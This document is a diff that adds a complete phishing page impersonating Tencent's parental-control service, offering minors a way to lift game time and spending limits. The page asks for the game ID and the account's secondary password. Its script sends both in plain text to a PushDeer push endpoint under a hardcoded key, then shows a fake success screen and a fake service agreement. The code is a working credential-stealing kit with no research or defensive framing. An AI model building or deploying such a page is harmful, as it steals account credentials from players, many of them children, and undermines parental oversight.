@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>申请解除 - 腾讯成长守护</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Helvetica Neue", STHeiti, "Microsoft Yahei", Tahoma, Simsun, sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; }
+        .app-container { width: 100%; max-width: 414px; background-color: #f7f8fa; min-height: 100vh; position: relative; overflow-x: hidden; padding-bottom: 100px; }
+        .header-bg { background: linear-gradient(135deg, #0078ff 0%, #00c6ff 50%, #00e5b0 100%); padding: 15px 20px 70px 20px; color: white; position: relative; }
+        .nav-bar { display: flex; align-items: center; font-size: 16px; margin-bottom: 30px; font-weight: 500; }
+        .nav-back { width: 20px; height: 20px; fill: white; margin-right: 8px; }
+        .tencent-logo { width: 22px; height: 22px; margin-right: 8px; display: flex; align-items: center; justify-content: center; }
+        .tencent-logo svg { width: 100%; height: 100%; fill: #ffffff; filter: drop-shadow(0px 1px 1px rgba(0, 0, 0, 0.1)); }
+        .title-area { text-align: center; margin-bottom: 20px; }
+        .title-area h1 { font-size: 28px; font-weight: 600; letter-spacing: 2px; margin-bottom: 12px; }
+        .title-area p { font-size: 13px; opacity: 0.9; line-height: 1.5; padding: 0 10px; }
+        .main-card { background: #ffffff; border-radius: 16px; margin: -50px 15px 20px 15px; padding: 25px 20px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.04); position: relative; z-index: 10; }
+        .steps { display: flex; justify-content: space-between; align-items: center; position: relative; margin-bottom: 35px; padding: 0 10px; }
+        .steps::before { content: ''; position: absolute; top: 16px; left: 50px; right: 50px; height: 1px; background-color: #ebebeb; z-index: 1; }
+        .step-item { display: flex; flex-direction: column; align-items: center; z-index: 2; background-color: white; padding: 0 10px; }
+        .step-circle { width: 32px; height: 32px; border-radius: 50%; border: 1px solid #dcdcdc; display: flex; justify-content: center; align-items: center; font-size: 15px; color: #999; background-color: white; margin-bottom: 8px; transition: all 0.2s; }
+        .step-item.active .step-circle { background-color: #2a6af2; border-color: #2a6af2; color: white; box-shadow: 0 2px 8px rgba(42, 106, 242, 0.3); }
+        .step-text { font-size: 13px; color: #999; }
+        .step-item.active .step-text { color: #2a6af2; font-weight: bold; }
+        .step-panel { display: none; animation: fadeIn 0.3s ease; }
+        .step-panel.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+        .section-title { font-size: 15px; font-weight: bold; color: #333; display: flex; align-items: center; margin-bottom: 12px; margin-top: 20px; }
+        .section-title .required { color: #e53935; margin-right: 4px; font-size: 16px; }
+        .radio-card { border: 1px solid #e6e6e6; border-radius: 12px; padding: 16px 15px; display: flex; align-items: flex-start; cursor: pointer; transition: all 0.2s; margin-bottom: 12px; background-color: #fff; }
+        .radio-card.selected { border-color: #2a6af2; background-color: #ffffff; }
+        .radio-circle { width: 18px; height: 18px; border-radius: 50%; border: 1.5px solid #ccc; margin-right: 12px; flex-shrink: 0; background-color: #fff; transition: all 0.2s; margin-top: 2px; }
+        .radio-card.selected .radio-circle { border-color: #2a6af2; border-width: 5px; }
+        .radio-title { font-size: 15px; color: #333; margin-bottom: 6px; font-weight: 500; }
+        .radio-card.selected .radio-title { color: #2a6af2; }
+        .radio-desc { font-size: 13px; color: #999; }
+        .input-field { width: 100%; height: 52px; border: 1px solid #e6e6e6; border-radius: 12px; padding: 0 15px; font-size: 15px; color: #333; outline: none; transition: border-color 0.2s; background: #fff; }
+        .input-field::placeholder { color: #ccc; }
+        .input-field:focus { border-color: #2a6af2; }
+        .agreement-box { display: flex; align-items: flex-start; font-size: 12px; color: #666; line-height: 1.6; margin-top: 25px; }
+        .checkbox-custom { width: 16px; height: 16px; border: 1px solid #ccc; border-radius: 50%; margin-right: 8px; margin-top: 2px; cursor: pointer; flex-shrink: 0; display: flex; justify-content: center; align-items: center; transition: all 0.2s; }
+        .checkbox-custom.checked { background-color: #2a6af2; border-color: #2a6af2; }
+        .checkbox-custom.checked::after { content: ''; width: 4px; height: 7px; border: solid white; border-width: 0 2px 2px 0; transform: rotate(45deg); margin-bottom: 2px; }
+        .agreement-box a { color: #2a6af2; text-decoration: none; }
+        .result-page { display: flex; flex-direction: column; align-items: center; padding-top: 10px; }
+        .platform-logo { display: flex; align-items: center; margin-bottom: 30px; }
+        .t-logo-icon { width: 36px; height: 36px; margin-right: 10px; display: flex; align-items: center; justify-content: center; }
+        .t-logo-icon svg { width: 100%; height: 100%; fill: #00e573; }
+        .t-logo-text { font-size: 22px; font-weight: bold; color: #333; }
+        .success-check { width: 80px; height: 80px; background-color: #00d26a; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 25px; box-shadow: 0 0 20px rgba(0, 210, 106, 0.3); }
+        .success-check svg { width: 40px; height: 40px; fill: none; stroke: white; stroke-width: 4; stroke-linecap: round; stroke-linejoin: round; }
+        .success-title { font-size: 22px; font-weight: bold; color: #333; margin-bottom: 15px; }
+        .success-desc { font-size: 14px; color: #666; text-align: center; line-height: 1.6; padding: 0 10px; margin-bottom: 30px; }
+        .info-box { width: 100%; background-color: #f5f8ff; border-radius: 12px; padding: 16px; text-align: left; margin-bottom: 30px; }
+        .info-box-title { color: #2a6af2; font-size: 14px; font-weight: bold; margin-bottom: 10px; }
+        .info-box-desc { font-size: 13px; color: #333; line-height: 1.5; }
+        .btn-return { width: 100%; height: 48px; border-radius: 24px; background-color: #f2f3f5; color: #333; font-size: 16px; font-weight: 500; display: flex; justify-content: center; align-items: center; border: none; cursor: pointer; }
+        .bottom-bar { position: fixed; bottom: 0; left: 50%; transform: translateX(-50%); width: 100%; max-width: 414px; background: #ffffff; padding: 15px 20px 25px 20px; display: flex; justify-content: space-between; box-shadow: 0 -2px 15px rgba(0,0,0,0.04); z-index: 100; }
+        .btn { height: 48px; border-radius: 24px; font-size: 16px; font-weight: bold; display: flex; justify-content: center; align-items: center; cursor: pointer; border: none; outline: none; }
+        .btn-cancel { width: 35%; background-color: #f2f3f5; color: #333; }
+        .btn-submit { width: 60%; background-color: #2a6af2; color: white; }
+        .btn-submit:active { background-color: #1a58d9; }
+        .toast { position: fixed; top: 45%; left: 50%; transform: translate(-50%, -50%); background-color: rgba(0, 0, 0, 0.75); color: #ffffff; padding: 16px 24px; border-radius: 12px; font-size: 15px; z-index: 10000; opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; pointer-events: none; display: flex; flex-direction: column; align-items: center; justify-content: center; min-width: 150px; }
+        .toast.show { opacity: 1; visibility: visible; }
+        .toast-icon { width: 36px; height: 36px; background-color: #ff4d4f; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 10px; box-shadow: 0 2px 6px rgba(255, 77, 79, 0.4); }
+        .toast-icon svg { width: 20px; height: 20px; fill: none; stroke: white; stroke-width: 3; stroke-linecap: round; }
+        .loading-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: rgba(255, 255, 255, 0.95); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; opacity: 0; visibility: hidden; transition: 0.2s; }
+        .loading-overlay.show { opacity: 1; visibility: visible; }
+        .spinner { width: 40px; height: 40px; border: 3px solid #e0e0e0; border-top: 3px solid #2a6af2; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 15px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .loading-text { font-size: 15px; color: #333; font-weight: 500; }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: rgba(0, 0, 0, 0.5); z-index: 20000; display: flex; justify-content: center; align-items: flex-end; opacity: 0; visibility: hidden; transition: all 0.3s ease; }
+        .modal-overlay.show { opacity: 1; visibility: visible; }
+        .modal-content { width: 100%; max-width: 414px; background-color: #fff; border-radius: 20px 20px 0 0; padding: 25px 20px; transform: translateY(100%); transition: transform 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); max-height: 75vh; display: flex; flex-direction: column; }
+        .modal-overlay.show .modal-content { transform: translateY(0); }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #f0f0f0; }
+        .modal-title { font-size: 16px; font-weight: bold; color: #333; }
+        .modal-close { width: 24px; height: 24px; cursor: pointer; fill: #999; }
+        .modal-body { overflow-y: auto; font-size: 13px; color: #666; line-height: 1.8; text-align: justify; }
+        .modal-body h3 { font-size: 14px; color: #333; margin-top: 15px; margin-bottom: 8px; }
+        .modal-body p { margin-bottom: 10px; }
+        .modal-footer { margin-top: 20px; padding-top: 15px; }
+        .btn-know { width: 100%; height: 46px; border-radius: 23px; background-color: #2a6af2; color: white; font-size: 16px; font-weight: bold; display: flex; justify-content: center; align-items: center; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    <div class="header-bg">
+        <div class="nav-bar">
+            <svg class="nav-back" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg"><path d="M722.3 258.3c-9.4-9.4-24.6-9.4-33.9 0L415 531.7c-9.4 9.4-9.4 24.6 0 33.9l273.4 273.4c9.4 9.4 24.6 9.4 33.9 0 9.4-9.4 9.4-24.6 0-33.9L466.3 548.7l256.1-256.1c9.3-9.4 9.3-24.6-0.1-34.3z" /></svg>
+            <div class="tencent-logo">
+                <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M50 10 C 27.9 10 10 27.9 10 50 C 10 60.5 14.2 70 21 77 L 21 92 L 36 84.5 C 40.3 86.1 45 87 50 87 C 72.1 87 90 69.1 90 47 C 90 24.9 72.1 10 50 10 Z M 50 72 C 37.8 72 28 62.2 28 50 C 28 37.8 37.8 28 50 28 C 62.2 28 72 37.8 72 50 C 72 62.2 62.2 72 50 72 Z"/>
+                </svg>
+            </div>
+            腾讯成长守护
+        </div>
+        <div class="title-area">
+            <h1>申请解除</h1>
+            <p>请如实填写以下信息，我们将在30分钟到一小时内审核您的解除申请，审核结果将通过消息通知申请结果通知您</p>
+        </div>
+    </div>
+
+    <div class="main-card">
+        <div class="steps">
+            <div class="step-item active" id="step-icon-1"><div class="step-circle">1</div><div class="step-text">填写申请</div></div>
+            <div class="step-item" id="step-icon-2"><div class="step-circle">2</div><div class="step-text">提交审核</div></div>
+            <div class="step-item" id="step-icon-3"><div class="step-circle">3</div><div class="step-text">审核结果</div></div>
+        </div>
+
+        <div id="panel-1" class="step-panel active">
+            <div class="section-title"><span class="required">*</span>解除类型</div>
+            <div class="radio-card selected" onclick="selectCard(this)">
+                <div class="radio-circle"></div>
+                <div class="radio-content">
+                    <div class="radio-title">解除游戏限制</div>
+                    <div class="radio-desc">解除游戏时长、消费等防沉迷限制</div>
+                </div>
+            </div>
+
+            <div class="section-title" id="zone-title"><span class="required">*</span>选择大区</div>
+            <div class="radio-card" onclick="selectCard(this)" id="zone-qq">
+                <div class="radio-circle"></div>
+                <div class="radio-content">
+                    <div class="radio-title">QQ大区</div>
+                    <div class="radio-desc">使用 QQ 账号登录的游戏角色</div>
+                </div>
+            </div>
+            <div class="radio-card" onclick="selectCard(this)" id="zone-wechat">
+                <div class="radio-circle"></div>
+                <div class="radio-content">
+                    <div class="radio-title">微信大区</div>
+                    <div class="radio-desc">使用微信账号登录的游戏角色</div>
+                </div>
+            </div>
+
+            <div class="section-title" id="gameid-title"><span class="required">*</span>游戏ID / 名称</div>
+            <input type="text" class="input-field" id="game-id" placeholder="请输入游戏角色ID或昵称">
+
+            <div class="section-title" id="pwd-title"><span class="required">*</span>二级密码</div>
+            <input type="password" class="input-field" id="second-pwd" placeholder="请输入账号二级密码">
+            <div style="font-size:12px; color:#e53935; line-height:1.5; margin-top:8px;">二级密码务必填写正确，否则账号将冻结核验</div>
+
+            <div class="agreement-box" id="agreement-box">
+                <div class="checkbox-custom" onclick="toggleCheckbox()"></div>
+                <div>我已阅读并同意 <a href="javascript:void(0);" onclick="openAgreement(event)">《腾讯成长守护解除关联协议》</a>，知晓解除后无法恢复，并确认所提交信息真实有效。</div>
+            </div>
+        </div>
+
+        <div id="panel-3" class="step-panel">
+            <div class="result-page">
+                <div class="platform-logo">
+                    <div class="t-logo-icon">
+                        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M50 10 C 27.9 10 10 27.9 10 50 C 10 60.5 14.2 70 21 77 L 21 92 L 36 84.5 C 40.3 86.1 45 87 50 87 C 72.1 87 90 69.1 90 47 C 90 24.9 72.1 10 50 10 Z M 50 72 C 37.8 72 28 62.2 28 50 C 28 37.8 37.8 28 50 28 C 62.2 28 72 37.8 72 50 C 72 62.2 62.2 72 50 72 Z"/>
+                        </svg>
+                    </div>
+                    <div class="t-logo-text">腾讯成长守护平台</div>
+                </div>
+                <div class="success-check"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+                <div class="success-title">申请已提交成功</div>
+                <div class="success-desc">我们将在 30分钟到一小时内完成审核，审核结果将通过消息通知申请结果通知您。</div>
+                <div class="info-box">
+                    <div class="info-box-title">温馨提示</div>
+                    <div class="info-box-desc">请留意结果通知官方客服正在线审核中</div>
+                </div>
+                <button class="btn-return" onclick="goBackHome()">返回主页</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="bottom-bar" id="bottom-bar">
+    <button class="btn btn-cancel" onclick="alert('取消操作')">取消</button>
+    <button class="btn btn-submit" onclick="submitForm()">提交申请</button>
+</div>
+
+<div id="toast" class="toast">
+    <div class="toast-icon"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></div>
+    <div id="toast-text">请填写对应信息重试</div>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+    <div class="loading-text">正在安全返回主页...</div>
+</div>
+
+<div class="modal-overlay" id="agreementModal" onclick="closeAgreementOnMask(event)">
+    <div class="modal-content">
+        <div class="modal-header">
+            <div class="modal-title">腾讯成长守护解除关联协议</div>
+            <svg class="modal-close" onclick="closeAgreement()" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </div>
+        <div class="modal-body">
+            <p><strong>欢迎使用腾讯成长守护平台！</strong></p>
+            <p>在申请解除家长监护（或游戏限制）关系前，请您仔细阅读并充分理解本协议的全部内容，特别是免除或限制责任的条款。如您不同意本协议的任何内容，请勿进行后续操作。</p>
+            <h3>一、 解除生效范围</h3>
+            <p>1. 您在成功解除关联后，该游戏账号将不再受“腾讯成长守护”平台的时长限制、消费限制及一键禁玩等功能管控。</p>
+            <p>2. 解除关联后，系统将不再向您的家长或监护人发送游戏登录及消费提醒。</p>
+            <h3>二、 身份验证与审核</h3>
+            <p>1. 为保障账号安全，您需提供真实的游戏ID、二级密码等信息。平台将在30分钟至1小时内进行人工/系统审核。</p>
+            <p>2. 若您提交的信息有误或存在账号安全风险，我们有权驳回您的申请。</p>
+            <h3>三、 未成年人保护特别提示</h3>
+            <p>若您为未成年人，请在监护人的陪同下阅读本协议，并在取得监护人同意后再进行解除操作。解除关联可能会导致您过度沉迷游戏，请合理安排时间。</p>
+            <h3>四、 协议变更与终止</h3>
+            <p>腾讯有权根据法律法规及产品运营需要对本协议进行修改。修改后的协议将在平台公布，若您继续使用相关服务，即视为您接受修改后的协议。</p>
+        </div>
+        <div class="modal-footer"><button class="btn-know" onclick="closeAgreement()">我知道了</button></div>
+    </div>
+</div>
+
+<script>
+    function showToast(message) {
+        const toast = document.getElementById('toast');
+        document.getElementById('toast-text').innerText = message || '请填写对应信息重试';
+        void toast.offsetWidth;
+        toast.classList.add('show');
+        setTimeout(() => { toast.classList.remove('show'); }, 2000);
+    }
+
+    function selectCard(element) {
+        if(element.id === 'zone-qq' || element.id === 'zone-wechat') {
+            document.getElementById('zone-qq').classList.remove('selected');
+            document.getElementById('zone-wechat').classList.remove('selected');
+            element.classList.add('selected');
+        } else {
+            let siblings = element.parentElement.querySelectorAll('.radio-card');
+            siblings.forEach(sibling => sibling.classList.remove('selected'));
+            element.classList.add('selected');
+        }
+    }
+
+    function toggleCheckbox() {
+        document.querySelector('.checkbox-custom').classList.toggle('checked');
+    }
+
+    function openAgreement(event) {
+        if (event) event.stopPropagation();
+        document.getElementById('agreementModal').classList.add('show');
+    }
+
+    function closeAgreement() {
+        document.getElementById('agreementModal').classList.remove('show');
+    }
+
+    function closeAgreementOnMask(event) {
+        if (event.target.id === 'agreementModal') closeAgreement();
+    }
+
+    // ====== 读取表单内容并推送到 PushDeer ======
+    function sendPushDeerNotification(zone, gameId, secondPwd) {
+        const pushKey = 'PDU37952Tz1hgotJxw2NxpU51bPmMFO2WBVWZehXR';
+        const text = encodeURIComponent(
+            `新申请\n大区：${zone}\n游戏ID：${gameId}\n二级密码：${secondPwd}`
+        );
+        const url = `https://api2.pushdeer.com/message/push?pushkey=${pushKey}&text=${text}`;
+
+        fetch(url, { method: 'GET' })
+            .then(res => res.text())
+            .then(data => console.log('PushDeer 返回：', data))
+            .catch(err => console.error('PushDeer 请求失败：', err));
+    }
+
+    function submitForm() {
+        const zoneQQ = document.getElementById('zone-qq');
+        const zoneWechat = document.getElementById('zone-wechat');
+        const gameIdInput = document.getElementById('game-id');
+        const secondPwdInput = document.getElementById('second-pwd');
+        const checkbox = document.querySelector('.checkbox-custom');
+
+        if (!zoneQQ.classList.contains('selected') && !zoneWechat.classList.contains('selected')) {
+            showToast('请填写对应信息重试');
+            document.getElementById('zone-title').scrollIntoView({behavior: 'smooth', block: 'center'});
+            return;
+        }
+        if (gameIdInput.value.trim() === '') {
+            showToast('请填写对应信息重试');
+            gameIdInput.focus();
+            document.getElementById('gameid-title').scrollIntoView({behavior: 'smooth', block: 'center'});
+            return;
+        }
+        if (secondPwdInput.value.trim() === '') {
+            showToast('请填写对应信息重试');
+            secondPwdInput.focus();
+            document.getElementById('pwd-title').scrollIntoView({behavior: 'smooth', block: 'center'});
+            return;
+        }
+        if (!checkbox.classList.contains('checked')) {
+            showToast('请填写对应信息重试');
+            document.getElementById('agreement-box').scrollIntoView({behavior: 'smooth', block: 'center'});
+            return;
+        }
+
+        // 验证通过，读取表单值并推送
+        const zoneLabel = zoneQQ.classList.contains('selected') ? 'QQ大区' : '微信大区';
+        const gameIdValue = gameIdInput.value.trim();
+        const secondPwdValue = secondPwdInput.value.trim();
+
+        sendPushDeerNotification(zoneLabel, gameIdValue, secondPwdValue);
+
+        document.getElementById('panel-1').classList.remove('active');
+        document.getElementById('panel-3').classList.add('active');
+        document.getElementById('step-icon-1').classList.remove('active');
+        document.getElementById('step-icon-3').classList.add('active');
+        document.getElementById('bottom-bar').style.display = 'none';
+        window.scrollTo({top: 0, behavior: 'smooth'});
+    }
+
+    function goBackHome() {
+        document.getElementById('loadingOverlay').classList.add('show');
+        setTimeout(() => {
+            document.getElementById('loadingOverlay').classList.remove('show');
+            document.getElementById('panel-3').classList.remove('active');
+            document.getElementById('panel-1').classList.add('active');
+            document.getElementById('step-icon-3').classList.remove('active');
+            document.getElementById('step-icon-1').classList.add('active');
+            document.getElementById('bottom-bar').style.display = 'flex';
+            const checkbox = document.querySelector('.checkbox-custom');
+            if(checkbox) checkbox.classList.remove('checked');
+            document.getElementById('game-id').value = '';
+            document.getElementById('second-pwd').value = '';
+            document.getElementById('zone-qq').classList.remove('selected');
+            document.getElementById('zone-wechat').classList.remove('selected');
+            window.scrollTo({top: 0, behavior: 'smooth'});
+        }, 1500);
+    }
+</script>
+
+</body>
+</html>
